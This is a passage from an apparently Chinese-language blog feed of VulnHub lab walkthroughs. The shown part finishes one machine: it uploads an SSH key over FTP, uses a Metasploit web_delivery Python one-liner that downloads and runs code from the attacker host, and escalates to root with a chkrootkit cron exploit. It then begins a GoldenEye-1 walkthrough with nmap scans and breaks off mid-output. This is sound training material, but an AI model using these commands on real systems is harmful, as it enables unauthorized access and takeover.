<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ftp 192.168.142.130</span></span><br><span class="line">Connected to 192.168.142.130.</span><br><span class="line">220 pyftpdlib based ftpd ready.</span><br><span class="line">Name (192.168.142.130:root): ashoka</span><br><span class="line">331 Username ok, send password.</span><br><span class="line">Password:</span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system <span class="built_in">type</span> is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">-rw-------   1 ashoka   ashoka          1 Nov 05 15:57 .bash_history</span><br><span class="line">-rw-r--r--   1 ashoka   ashoka        220 Nov 05 14:05 .bash_logout</span><br><span class="line">-rw-r--r--   1 ashoka   ashoka       3771 Nov 05 14:05 .bashrc</span><br><span class="line">drwx------   2 ashoka   ashoka       4096 Nov 05 14:18 .cache</span><br><span class="line">drwxrwxr-x   3 ashoka   ashoka       4096 Nov 05 14:26 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r--   1 ashoka   ashoka        807 Nov 05 14:05 .profile</span><br><span class="line">226 Transfer complete.</span><br><span class="line">ftp&gt; mkdir .ssh</span><br><span class="line">257 <span class="string">&quot;/.ssh&quot;</span> directory created.</span><br><span class="line">ftp&gt; <span class="built_in">cd</span> .ssh</span><br><span class="line">250 <span class="string">&quot;/.ssh&quot;</span> is the current directory.</span><br></pre></td></tr></table></figure>

<p>现在该生成一些ssh密钥了。 使用ssh-keygen创建了一些密钥。 输入的密码为“ 123”。 这可以是您选择的任何东西。 将其保留下来以便于记忆。 在创建密钥之后继续前进，进入了本机shell程序的.ssh目录。 在这里，看到了名为“ id_rsa.pub”的密钥。 现在需要将此密钥上传到FTP，因此将is_rsa.pub的内容复制到名为authorized_keys的文件中。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">root@kali:~/.ssh<span class="comment"># cat id_rsa.pub &gt; authorized_keys</span></span><br><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub  known_hosts</span><br><span class="line">root@kali:~/.ssh<span class="comment"># cat id_rsa.pub</span></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTIuh8j20bp4uFWWmOn9IXRvRYDVvBjARjPeCZ7o00nnwTzJ/Y1OBU1AoDVNIq6aM/CVJ9qCy0zceqNfC1roGUM+cvUVO+qR5aG+QnT8mxdRnoXin+JAk8nFuynJ63016zuauB0iQUwyQ9dRm+jzW9+J/9S86Fd/qcbKNYbW5wn9Chh3T+bj+T+6RCKlU7q6q+Kc1S4WfI7iXJ6doR9hxD91CRUVWG/KyADbZuWsTuDyxxrQ/KA8ek05owsokgIc9rS8ZjtB23rR1yai/B3hfjjQgKMQkF6k9D7J6Qm07VgDZkYm4RTxlO8bDDnfkNOBs9rzBomPrN2rOeounir4ZIj+dDDpH9tGklDLyCW6RKx8fiN/s9z5Knf61a+9nielEO8DUqaEt+bHTl/3uVimZ01upoLEamclLadpMSBfT6CccUnD2bu4Kcb9kcOjHTW4pQEL9BXSu+upvQDJyRsPxy1JLNZ5xdkJoQKyt5OArNjUq7SsVAOZzNQRaM3JGit9s= root@kali</span><br><span class="line">root@kali:~/.ssh<span class="comment"># cat authorized_keys </span></span><br><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDTIuh8j20bp4uFWWmOn9IXRvRYDVvBjARjPeCZ7o00nnwTzJ/Y1OBU1AoDVNIq6aM/CVJ9qCy0zceqNfC1roGUM+cvUVO+qR5aG+QnT8mxdRnoXin+JAk8nFuynJ63016zuauB0iQUwyQ9dRm+jzW9+J/9S86Fd/qcbKNYbW5wn9Chh3T+bj+T+6RCKlU7q6q+Kc1S4WfI7iXJ6doR9hxD91CRUVWG/KyADbZuWsTuDyxxrQ/KA8ek05owsokgIc9rS8ZjtB23rR1yai/B3hfjjQgKMQkF6k9D7J6Qm07VgDZkYm4RTxlO8bDDnfkNOBs9rzBomPrN2rOeounir4ZIj+dDDpH9tGklDLyCW6RKx8fiN/s9z5Knf61a+9nielEO8DUqaEt+bHTl/3uVimZ01upoLEamclLadpMSBfT6CccUnD2bu4Kcb9kcOjHTW4pQEL9BXSu+upvQDJyRsPxy1JLNZ5xdkJoQKyt5OArNjUq7SsVAOZzNQRaM3JGit9s= root@kali</span><br><span class="line">root@kali:~/.ssh<span class="comment"># ls</span></span><br><span class="line">authorized_keys  id_rsa  id_rsa.pub  known_hosts</span><br></pre></td></tr></table></figure>
<p>使用put命令将文件传输到目标计算机</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ftp&gt; put authorized_keys </span><br><span class="line"><span class="built_in">local</span>: authorized_keys remote: authorized_keys</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">226 Transfer complete.</span><br><span class="line">563 bytes sent <span class="keyword">in</span> 0.00 secs (14.5113 MB/s)</span><br><span class="line">ftp&gt; ls</span><br><span class="line">200 Active data connection established.</span><br><span class="line">125 Data connection already open. Transfer starting.</span><br><span class="line">-rw-r--r--   1 root     root          563 Dec 16 05:30 authorized_keys</span><br><span class="line">226 Transfer complete.</span><br></pre></td></tr></table></figure>

<p>现在，使用ssh连接到目标计算机。 由于之前放置了授权密钥，因此现在可以登录。 得到了Ashoka用户的shell。 经过一些枚举，看到临时文件中有一个日志文件。 尝试使用cat命令。 看起来像Chkrootkit测试结果日志。 这提示也许可以使用Chkrootkit在此计算机上升级特权。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh ashoka@192.168.142.130</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.142.130 (192.168.142.130)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:cuEf1JsbferQL5tQ/iVC9mGMCIALDE5/sX/OJt5LgPQ.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.142.130<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Enter passphrase for key &#x27;</span>/root/.ssh/id_rsa<span class="string">&#x27;: </span></span><br><span class="line"><span class="string">Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Canonical Livepatch is available for installation.</span></span><br><span class="line"><span class="string">   - Reduce system reboots and improve kernel security. Activate at:</span></span><br><span class="line"><span class="string">     https://ubuntu.com/livepatch</span></span><br><span class="line"><span class="string">Last login: Tue Nov  5 06:36:00 2019 from 192.168.1.107</span></span><br><span class="line"><span class="string">ashoka@ubuntu:~$ id</span></span><br><span class="line"><span class="string">uid=1001(ashoka) gid=1001(ashoka) groups=1001(ashoka)</span></span><br><span class="line"><span class="string">ashoka@ubuntu:~$ whoami</span></span><br><span class="line"><span class="string">ashoka</span></span><br><span class="line"><span class="string">ashoka@ubuntu:~$ cat /tmp/logs</span></span><br><span class="line"><span class="string">ROOTDIR is `/&#x27;</span></span><br><span class="line">Checking `amd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `basename&#x27;</span>... not infected</span><br><span class="line">Checking `biff<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `chfn&#x27;</span>... not infected</span><br><span class="line">Checking `chsh<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `cron&#x27;</span>... not infected</span><br><span class="line">Checking `crontab<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `date&#x27;</span>... not infected</span><br><span class="line">Checking `du<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `dirname&#x27;</span>... not infected</span><br><span class="line">Checking `<span class="built_in">echo</span><span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `egrep&#x27;</span>... not infected</span><br><span class="line">Checking `env<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `find&#x27;</span>... not infected</span><br><span class="line">Checking `fingerd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `gpm&#x27;</span>... not found</span><br><span class="line">Checking `grep<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `hdparm&#x27;</span>... not infected</span><br><span class="line">Checking `su<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `ifconfig&#x27;</span>... not infected</span><br><span class="line">Checking `inetd<span class="string">&#x27;... not tested</span></span><br><span class="line"><span class="string">Checking `inetdconf&#x27;</span>... not found</span><br><span class="line">Checking `identd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `init&#x27;</span>... not infected</span><br><span class="line">Checking `killall<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `ldsopreload&#x27;</span>... can<span class="string">&#x27;t exec ./strings-static, not tested</span></span><br><span class="line"><span class="string">Checking `login&#x27;</span>... not infected</span><br><span class="line">Checking `ls<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `lsof&#x27;</span>... not infected</span><br><span class="line">Checking `mail<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `mingetty&#x27;</span>... not found</span><br><span class="line">Checking `netstat<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `named&#x27;</span>... not found</span><br><span class="line">Checking `passwd<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `pidof&#x27;</span>... not infected</span><br><span class="line">Checking `pop2<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `pop3&#x27;</span>... not found</span><br><span class="line">Checking `ps<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `pstree&#x27;</span>... not infected</span><br><span class="line">Checking `rpcinfo<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `rlogind&#x27;</span>... not found</span><br><span class="line">Checking `rshd<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `slogin&#x27;</span>... not infected</span><br><span class="line">Checking `sendmail<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `sshd&#x27;</span>... not infected</span><br><span class="line">Checking `syslogd<span class="string">&#x27;... not tested</span></span><br><span class="line"><span class="string">Checking `tar&#x27;</span>... not infected</span><br><span class="line">Checking `tcpd<span class="string">&#x27;... INFECTED</span></span><br><span class="line"><span class="string">Checking `tcpdump&#x27;</span>... not infected</span><br><span class="line">Checking `top<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `telnetd&#x27;</span>... not found</span><br><span class="line">Checking `timed<span class="string">&#x27;... not found</span></span><br><span class="line"><span class="string">Checking `traceroute&#x27;</span>... not found</span><br><span class="line">Checking `vdir<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `w&#x27;</span>... not infected</span><br><span class="line">Checking `write<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `aliens&#x27;</span>... no suspect files</span><br><span class="line">Searching <span class="keyword">for</span> sniffer<span class="string">&#x27;s logs, it may take a while... nothing found</span></span><br><span class="line"><span class="string">Searching for HiDrootkit&#x27;</span>s default dir... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> t0rn<span class="string">&#x27;s default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for t0rn&#x27;</span>s v8 defaults... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> Lion Worm default files and <span class="built_in">dirs</span>... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> RSHA<span class="string">&#x27;s default files and dir... nothing found</span></span><br><span class="line"><span class="string">Searching for RH-Sharpe&#x27;</span>s default files... nothing found</span><br><span class="line">Searching <span class="keyword">for</span> Ambient<span class="string">&#x27;s rootkit (ark) default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for suspicious files and dirs, it may take a while... </span></span><br><span class="line"><span class="string">/lib/modules/4.15.0-20-generic/vdso/.build-id</span></span><br><span class="line"><span class="string">/lib/modules/4.15.0-20-generic/vdso/.build-id</span></span><br><span class="line"><span class="string">Searching for LPD Worm files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Ramen Worm files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Maniac files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for RK17 files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Ducoci rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Adore Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for ShitC Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for Omega Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for Sadmind/IIS Worm... nothing found</span></span><br><span class="line"><span class="string">Searching for MonKit... nothing found</span></span><br><span class="line"><span class="string">Searching for Showtee... nothing found</span></span><br><span class="line"><span class="string">Searching for OpticKit... nothing found</span></span><br><span class="line"><span class="string">Searching for T.R.K... nothing found</span></span><br><span class="line"><span class="string">Searching for Mithra... nothing found</span></span><br><span class="line"><span class="string">Searching for LOC rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Romanian rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Suckit rootkit... Warning: /sbin/init INFECTED</span></span><br><span class="line"><span class="string">Searching for Volc rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for Gold2 rootkit... nothing found</span></span><br><span class="line"><span class="string">Searching for TC2 Worm default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Anonoying rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for ZK rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for ShKit rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for AjaKit rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for zaRwT rootkit default files and dirs... nothing found</span></span><br><span class="line"><span class="string">Searching for Madalin rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for Fu rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for ESRK rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for rootedoor... nothing found</span></span><br><span class="line"><span class="string">Searching for ENYELKM rootkit default files... nothing found</span></span><br><span class="line"><span class="string">Searching for common ssh-scanners default files... nothing found</span></span><br><span class="line"><span class="string">Searching for suspect PHP files... nothing found</span></span><br><span class="line"><span class="string">Searching for anomalies in shell history files... nothing found</span></span><br><span class="line"><span class="string">Checking `asp&#x27;</span>... not infected</span><br><span class="line">Checking `bindshell<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `lkm&#x27;</span>... not tested: can<span class="string">&#x27;t exec </span></span><br><span class="line"><span class="string">Checking `rexedcs&#x27;</span>... not found</span><br><span class="line">Checking `sniffer<span class="string">&#x27;... not tested: can&#x27;</span>t <span class="built_in">exec</span> ./ifpromisc</span><br><span class="line">Checking `w55808<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `wted&#x27;</span>... not tested: can<span class="string">&#x27;t exec ./chkwtmp</span></span><br><span class="line"><span class="string">Checking `scalper&#x27;</span>... not infected</span><br><span class="line">Checking `slapper<span class="string">&#x27;... not infected</span></span><br><span class="line"><span class="string">Checking `z2&#x27;</span>... not tested: can<span class="string">&#x27;t exec ./chklastlog</span></span><br><span class="line"><span class="string">Checking `chkutmp&#x27;</span>... not tested: can<span class="string">&#x27;t exec ./chkutmp</span></span><br><span class="line"><span class="string">Checking `OSX_RSPLUG&#x27;</span>... not infected</span><br></pre></td></tr></table></figure>

<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>现在，要在目标计算机上升级特权，将需要在目标计算机上配备一个meterpreter，并在Metasploit的帮助下使用get root。 使用web_delivery漏洞利用meterpreter。 在use命令的帮助下选择了web_delivery利用，然后提供了lhost。 Lhost是目标计算机（Kali Linux）的IP地址。 将输入漏洞利用代码。 这将创建一个单行脚本，该脚本将使我们对目标计算机有一个meterpreter。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line"><span class="comment"># cowsay++</span></span><br><span class="line"> ____________                                                                                          </span><br><span class="line">&lt; metasploit &gt;                                                                                         </span><br><span class="line"> ------------                                                                                          </span><br><span class="line">       \   ,__,                                                                                        </span><br><span class="line">        \  (oo)____                                                                                    </span><br><span class="line">           (__)    )\                                                                                  </span><br><span class="line">              ||--|| *                                                                                 </span><br><span class="line">                                                                                                       </span><br><span class="line"></span><br><span class="line">       =[ metasploit v5.0.63-dev                          ]</span><br><span class="line">+ -- --=[ 1951 exploits - 1091 auxiliary - 334 post       ]</span><br><span class="line">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span><br><span class="line">+ -- --=[ 7 evasion                                       ]</span><br><span class="line"></span><br><span class="line">msf5 &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LHOST 192.168.142.128</span><br><span class="line">LHOST =&gt; 192.168.142.128</span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; exploit</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.142.128:4444 </span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; [*] Using URL: http://0.0.0.0:8080/iG1jsBgk9ZBOAY</span><br><span class="line">[*] Local IP: http://192.168.142.128:8080/iG1jsBgk9ZBOAY</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">python -c <span class="string">&quot;import sys;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://192.168.142.128:8080/iG1jsBgk9ZBOAY&#x27;);exec(r.read());&quot;</span></span><br></pre></td></tr></table></figure>

<p>复制漏洞利用程序生成的命令，并在之前获得的ssh会话运行python -c “import sys;u=<strong>import</strong>(‘urllib’+{2:’’,3:’.request’}[sys.version_info[0]],fromlist=(‘urlopen’,));r=u.urlopen(‘<span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEyODo4MDgwL2lHMWpzQmdrOVpCT0FZJiMzOTspO2V4ZWMoci5yZWFkKCkpOyZxdW90OyVFMyU4MCU4Mg==">http://192.168.142.128:8080/iG1jsBgk9ZBOAY&#39;);exec(r.read());&quot;。<i class="fa fa-external-link-alt"></i></span></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ashoka@ubuntu:~$ python -c <span class="string">&quot;import sys;u=__import__(&#x27;urllib&#x27;+&#123;2:&#x27;&#x27;,3:&#x27;.request&#x27;&#125;[sys.version_info[0]],fromlist=(&#x27;urlopen&#x27;,));r=u.urlopen(&#x27;http://192.168.142.128:8080/iG1jsBgk9ZBOAY&#x27;);exec(r.read());&quot;</span></span><br></pre></td></tr></table></figure>

<p>这给了需要的session。将使用Metasploit中的内置漏洞利用程序，可以帮助我们在目标计算机上获得root shell。 我们选择了会话并为另一个会话提供了端口。 键入漏洞利用程序后，发现漏洞利用程序正在运行，并且通过前面提到的端口为我们提供了另一个shell为了将shell转换为能够用的shell，运行了python单行代码以生成TTY shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf5 exploit(multi/script/web_delivery) &gt; </span><br><span class="line">[*] 192.168.142.130  web_delivery - Delivering Payload (454) bytes</span><br><span class="line">[*] Sending stage (53755 bytes) to 192.168.142.130</span><br><span class="line">[*] Meterpreter session 3 opened (192.168.142.128:4444 -&gt; 192.168.142.130:38970) at 2019-12-16 01:06:52 -0500</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; </span><br><span class="line">msf5 exploit(multi/script/web_delivery) &gt; use exploit/unix/<span class="built_in">local</span>/chkrootkit</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; <span class="built_in">set</span> session 3</span><br><span class="line">session =&gt; 3</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; <span class="built_in">set</span> lport 8888</span><br><span class="line">lport =&gt; 8888</span><br><span class="line">msf5 exploit(unix/<span class="built_in">local</span>/chkrootkit) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP double handler on 192.168.142.128:8888 </span><br><span class="line">[!] Rooting depends on the crontab (this could take a <span class="keyword">while</span>)</span><br><span class="line">[*] Payload written to /tmp/update</span><br><span class="line">[*] Waiting <span class="keyword">for</span> chkrootkit to run via cron...</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> XMnVavzOqVIfxgY5;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: <span class="string">&quot;XMnVavzOqVIfxgY5\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 4 opened (192.168.142.128:8888 -&gt; 192.168.142.130:44238) at 2019-12-16 01:09:28 -0500</span><br><span class="line">whoami</span><br><span class="line">[*] Accepted the first client connection...</span><br><span class="line">[*] Accepted the second client connection...</span><br><span class="line">[*] Command: <span class="built_in">echo</span> BGwiPjx0EW1uplK3;</span><br><span class="line">[*] Writing to socket A</span><br><span class="line">[*] Writing to socket B</span><br><span class="line">[*] Reading from sockets...</span><br><span class="line">[*] Reading from socket A</span><br><span class="line">[*] A: <span class="string">&quot;BGwiPjx0EW1uplK3\r\n&quot;</span></span><br><span class="line">[*] Matching...</span><br><span class="line">[*] B is input...</span><br><span class="line">[*] Command shell session 5 opened (192.168.142.128:8888 -&gt; 192.168.142.130:44242) at 2019-12-16 01:10:28 -0500</span><br><span class="line">[!] Tried to delete /tmp/update, unknown result</span><br><span class="line">root</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># whoami</span></span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">ls</span><br><span class="line">final.txt</span><br><span class="line"><span class="comment"># cat final.txt</span></span><br><span class="line">cat final.txt</span><br><span class="line">                                                                   </span><br><span class="line">!! Congrats you have finished this task !!</span><br><span class="line"></span><br><span class="line">Contact us here:</span><br><span class="line"></span><br><span class="line">Hacking Articles : https://twitter.com/rajchandel/</span><br><span class="line">Geet Madan : https://in.linkedin.com/<span class="keyword">in</span>/geet-madan</span><br><span class="line"></span><br><span class="line">+-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line"> |E|n|j|o|y| |H|A|C|K|I|N|G|</span><br><span class="line"> +-+-+-+-+-+ +-+-+-+-+-+-+-+</span><br><span class="line">____________________________________</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>找到一个文本文件final.txt，将其打开以查找final flag,挑战到此结束,6的一批。</p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="red"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[GoldenEye-1]</title>
    <url>/2020/01/08/GoldenEye-1/</url>
    <content><![CDATA[<h3 id="发布日期"><a href="#发布日期" class="headerlink" title="发布日期"></a>发布日期</h3><p>名称：GoldenEye：1<br>发布日期：2018年5月4日</p>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download: <span class="exturl" data-url="aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL29wZW4/aWQ9MU03bU1kU01ISHBpRktXM0pMcXE4Ym9Ockk5NU52NHRx">https://drive.google.com/open?id=1M7mMdSMHHpiFKW3JLqq8boNrI95Nv4tq<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2xkZW5leWUvR29sZGVuRXllLXYxLm92YQ==">https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2xkZW5leWUvR29sZGVuRXllLXYxLm92YS50b3JyZW50">https://download.vulnhub.com/goldeneye/GoldenEye-v1.ova.torrent<i class="fa fa-external-link-alt"></i></span> </li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>级别：中级</p>
<p>最近完成了创建OSCP型易受攻击的计算机的工作，该计算机的主题是伟大的James Bond电影（甚至更好的n64游戏）GoldenEye。目标是root并捕获秘密的GoldenEye代码-flag.txt。我认为它是中级的，它具有root所需的多种技术-没有漏洞利用开发/缓冲区溢出。在完成OSCP之后，我认为这将是一个不错的实践，另外还有一点CTF风味。我已经在VMware和VirtualBox上创建并验证。除了默认情况下，您不需要其他工具。将需要设置为“host only”，并且在VMware上，由于格式化，在最初启动它时，如果出现提示，可能需要单击“重试”。</p>
<p>Beta-2018-05-02 v1-2018-05-04</p>
<p>GoldenEye是由creosote发起并在Vulnhub举办的一项以秘密服务为主题的挑战。GoldenEye是一个CTF样式的框，而不是现实的渗透测试方案。此框需要相当多的“即开即用”的思想，才能找到根源。</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.101</span><br><span class="line">Host is up (0.00025s latency).</span><br><span class="line">MAC Address: 08:00:27:3B:86:3C (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p- -n -Pn -v -sV 192.168.56.101</span></span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">55006/tcp open  ssl/unknown</span><br><span class="line">55007/tcp open  pop3        Dovecot pop3d</span><br></pre></td></tr></table></figure>
<p>除了在端口80上运行的Web应用程序之外，还有两个pop3端口和一个smtp端口。建议使用主应用程序导航到/sev-home/。但是，该应用程序在浏览到/sev-home/时提示输入用户名和密码，而我对凭证还一无所知。</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub132.jpg"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -p 25,80,55006,55007 -A -v -Pn -n -sV -T5 --script=vuln --min-rate=10000 192.168.56.101</span></span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">25/tcp    open  smtp        Postfix smtpd</span><br><span class="line">|_clamav-exec: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smtp-vuln-cve2010-4344: </span><br><span class="line">|_  The SMTP server is not Exim: NOT VULNERABLE</span><br><span class="line">| ssl-dh-params: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|       Transport Layer Security (TLS) services that use anonymous</span><br><span class="line">|       Diffie-Hellman key exchange only provide protection against passive</span><br><span class="line">|       eavesdropping, and are vulnerable to active man-in-the-middle attacks</span><br><span class="line">|       <span class="built_in">which</span> could completely compromise the confidentiality and integrity</span><br><span class="line">|       of any data exchanged over the resulting session.</span><br><span class="line">|     Check results:</span><br><span class="line">|       ANONYMOUS DH GROUP 1</span><br><span class="line">|             Cipher Suite: TLS_DH_anon_WITH_AES_128_CBC_SHA</span><br><span class="line">|             Modulus Type: Safe prime</span><br><span class="line">|             Modulus Source: postfix <span class="built_in">builtin</span></span><br><span class="line">|             Modulus Length: 1024</span><br><span class="line">|             Generator Length: 8</span><br><span class="line">|             Public Key Length: 1024</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.ietf.org/rfc/rfc2246.txt</span><br><span 